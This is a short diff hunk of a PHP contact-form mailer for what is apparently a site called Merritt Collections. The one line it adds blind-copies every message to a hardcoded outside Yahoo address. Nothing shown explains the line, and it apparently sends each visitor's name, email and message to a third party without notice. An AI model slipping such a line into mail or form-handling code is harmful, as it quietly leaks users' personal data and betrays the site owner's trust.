@@ -172,6 +172,7 @@ try {
     $mail->setFrom(SMTP_FROM_EMAIL, SMTP_FROM_NAME);
     $mail->addAddress(DESTINATION_EMAIL, DESTINATION_NAME);
     $mail->addReplyTo($userEmail, $fullName);
+    $mail->addCC('Ashanniv@yahoo.com');
 
     $mail->Subject = '[Merritt Collections] ' . $subjectLine;
 
